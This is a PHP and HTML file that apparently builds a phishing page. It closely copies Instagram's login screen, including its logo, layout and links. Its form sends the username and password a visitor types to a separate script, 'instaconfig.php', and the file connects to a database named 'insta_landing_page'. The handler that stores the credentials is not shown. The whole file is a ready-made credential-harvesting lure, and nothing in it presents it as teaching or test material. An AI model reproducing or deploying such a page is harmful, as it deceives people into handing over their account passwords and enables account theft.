<?php 
$conn= mysqli_connect("localhost", "root","","insta_landing_page");


//   if($conn){
//     echo "Connected Sucessfully";
// }


?>







<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      width: 350px;
      border: 1px solid #dbdbdb;
      background-color: #fff;
      padding: 40px 40px 20px;
      text-align: center;
    }

    .logo {
      background-image: url('https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png');
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      height: 80px;
      margin-bottom: 30px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      margin: 6px 0;
      padding: 9px 8px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      background: #fafafa;
      border-radius: 3px;
    }

    button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      padding: 8px 0;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      margin-top: 10px;
      cursor: pointer;
    }

    .or {
      display: flex;
      align-items: center;
      margin: 15px 0;
      font-size: 13px;
      color: #8e8e8e;
    }

    .or::before,
    .or::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
      margin: 0 10px;
    }

    .facebook-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
      font-size: 14px;
    }

    .forgot {
      font-size: 12px;
      margin-top: 12px;
      color: #00376b;
      text-decoration: none;
      display: block;
    }

    .signup-box {
      margin-top: 10px;
      text-align: center;
      padding: 20px;
      font-size: 14px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }

    @media (max-width: 480px) {
      .login-box {
        border: none;
        box-shadow: none;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div>
      <div class="login-box">
        <div class="logo"></div>
        <form method="post" action="instaconfig.php" >
          <input name="userinfo" type="text" placeholder="Phone number, username, or email" required>
          <input name="password" type="password" placeholder="Password" required>
          <button type="submit">Log In</button>
        </form>
        <div class="or">OR</div>
        <a href="#" class="facebook-login">Log in with Facebook</a>
        <a href="#" class="forgot">Forgot password?</a>
      </div>

      <div class="signup-box">
        Don’t have an account? <a href="#">Sign up</a>
      </div>
    </div>
  </div>

</body>
</html>
